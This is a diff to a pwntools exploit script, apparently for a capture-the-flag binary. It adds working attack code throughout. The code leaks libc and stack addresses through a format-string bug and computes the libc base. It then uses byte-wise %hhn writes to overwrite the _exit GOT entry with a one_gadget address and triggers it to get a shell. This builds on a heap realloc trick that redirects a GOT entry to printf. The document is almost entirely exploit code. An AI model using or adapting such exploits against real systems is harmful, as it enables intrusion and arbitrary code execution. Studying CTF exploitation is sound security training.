@@ -10,8 +10,7 @@ def start(argv=[], *a, **kw):
 
 gdbscript = '''
 init-pwndbg
-b *reallocate
-b *allocate
+b *0x040129d
 continue
 '''.format(**locals())
 
@@ -54,11 +53,14 @@ def exit():
 def fmt_leak(idx):
         sla(b'Your choice: ',b'1')
         sa(b'Index:',f'%{idx}$p')
-        #print(conn.recv(14))
+        return conn.recv(14)
 
 def fmt_write(idx, value):
         sla(b'Your choice: ',b'1')
         sa(b'Index:',f'%{value}c%{idx}$hhn'.ljust(16))
+
+def leave():
+	sla(b'Your choice: ', b'4')
 
 alloc(0, 0x50, b'B' * 0x50)
 realloc(0, 0, b'')
@@ -77,6 +79,27 @@ free(1)
 
 alloc(1, 0x50, p64(printPLT))
 
-fmt_leak(23)
+leak_libc = int(fmt_leak(23).decode(),16)
+stack_address = int(fmt_leak(18).decode(), 16)
+libc.address = leak_libc - 0x26b6b
+
+print("Leak $12%p: ", fmt_leak(12))
+print("Leak $18%p: ", fmt_leak(18))
+print("Leak libc start main: ", hex(leak_libc))
+print("Libc: ", hex(libc.address))
+
+for i in range(3):
+    fmt_write(12, (stack_address & 0xff) + i)
+    fmt_write(18, p64(elf.got['_exit'])[i])
+
+# overwrite got address of _exit with one_gadget
+one_gadget = libc.address + 0xe2383
+fmt_write(12, stack_address & 0xff)
+for i in range(6):
+    fmt_write(18, (elf.got['_exit'] & 0xff) + i)
+    fmt_write(22, p64(one_gadget)[i])
+
+# trigger one_gadget
+leave()
 
 conn.interactive()
